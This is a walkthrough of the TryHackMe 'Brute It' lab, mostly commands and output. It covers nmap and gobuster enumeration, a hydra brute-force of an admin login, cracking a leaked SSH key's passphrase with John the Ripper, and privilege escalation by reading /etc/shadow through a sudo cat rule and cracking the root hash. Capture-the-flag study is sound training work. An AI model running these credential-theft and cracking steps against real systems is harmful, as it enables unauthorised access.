@@ -1,0 +1,124 @@
+#+TITLE: TryHackMe - Brute It writeup
+
+[https://tryhackme.com/room/bruteit]
+
+* Scanning & Enumerating services
+
+	#+begin_src shell
+		nmap -T4 -vv 10.10.209.151
+		nmap -p 22,80 -vv -sC -sV 10.10.209.151
+
+		PORT   STATE SERVICE REASON  VERSION
+		22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+		| ssh-hostkey:
+		|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+		| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
+		|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+		| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
+		|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+		|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
+		80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+		| http-methods:
+		|_  Supported Methods: GET POST OPTIONS HEAD
+		|_http-title: Apache2 Ubuntu Default Page: It works
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	#+end_src
+
+	#+begin_src shell
+		gobuster dir -u http://10.10.209.151 -w /usr/share/wordlists/dirb/common.txt -t 4
+
+		/.htaccess            (Status: 403) [Size: 278]
+		/.hta                 (Status: 403) [Size: 278]
+		/.htpasswd            (Status: 403) [Size: 278]
+		/admin                (Status: 301) [Size: 314] [--> http://10.10.209.151/admin/]
+		/index.html           (Status: 200) [Size: 10918]
+		/server-status        (Status: 403) [Size: 278]
+	#+end_src
+
+* Getting a shell & user flag
+
+	http://10.10.209.151/admin/ presents a login panel, and the source code reveals that the username is *admin*, with a suble HTML comment: "<!-- Hey john, if you do not remember, the username is admin -->".
+
+	#+begin_src shell
+		# note /admin/ to avoid the 301 redirect interfering
+		hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.209.151 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid" -t 4
+
+		[80][http-post-form] host: 10.10.209.151   login: admin   password: xxxxxx
+	#+end_src
+
+	This gives us access to the web flag and a *RSA private key*! The password for the private key can be cracked using John The Ripper.
+
+	#+begin_src shell
+		wget http://10.10.209.151/admin/panel/id_rsa
+
+		/usr/share/john/ssh2john.py id_rsa > hash
+		john -format:SSH -wordlist:/usr/share/wordlists/rockyou.txt hash
+
+		Using default input encoding: UTF-8
+		Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+		Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+		Cost 2 (iteration count) is 1 for all loaded hashes
+		Will run 4 OpenMP threads
+		Note: This format may emit false positives, so it will keep trying even after
+		finding a possible candidate.
+		Press 'q' or Ctrl-C to abort, almost any other key for status
+		xxxxxxxxxx       (id_rsa)
+		Warning: Only 2 candidates left, minimum 4 needed for performance.
+		1g 0:00:00:02 DONE (2021-06-03 21:31) 0.4484g/s 6431Kp/s 6431Kc/s 6431KC/sa6_123..*7¡Vamos!
+		Session completed
+	#+end_src
+
+	The HTML page title and source code mentions "john" twice, let's test it as a username.
+
+	#+begin_src shell
+		chmod 600 id_rsa
+		ssh john@10.10.209.151 -i id_rsa
+
+		Enter passphrase for key 'id_rsa':
+		Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+		Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
+		john@bruteit:~$
+		john@bruteit:~$ cat user.txt
+	#+end_src
+
+* Privilege Escalation & root flag
+
+	#+begin_src shell
+		sudo -l
+
+		User john may run the following commands on bruteit:
+				(root) NOPASSWD: /bin/cat
+	#+end_src
+
+	We can run cat as root, let's have a look at the /etc/shadow file and retrieve the root password's hash.
+
+	#+begin_src shell
+		sudo /bin/cat /etc/shadow | grep root > hash_root
+	#+end_src
+
+	Retrieve the hash on the attack box and crack it.
+
+	#+begin_src shell
+		scp -i id_rsa john@10.10.121.53:root_hash .
+		john -format:sha512crypt -wordlist:/usr/share/wordlists/rockyou.txt root_hash
+
+		Created directory: /home/kali/.john
+		Using default input encoding: UTF-8
+		Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+		Cost 1 (iteration count) is 5000 for all loaded hashes
+		Will run 4 OpenMP threads
+		Press 'q' or Ctrl-C to abort, almost any other key for status
+		xxxxxxxx         (root)
+		1g 0:00:00:00 DONE (2021-06-04 08:45) 7.692g/s 3938p/s 3938c/s 3938C/s 123456..letmein
+		Use the "--show" option to display all of the cracked passwords reliably
+		Session completed
+	#+end_src
+
+	We now have the root password and the means to read ''/root/root.txt'.
+
+	#+begin_src shell
+		john@bruteit:~$ su root
+		Password:
+		root@bruteit:/home/john# cat /root/root.txt
+	#+end_src
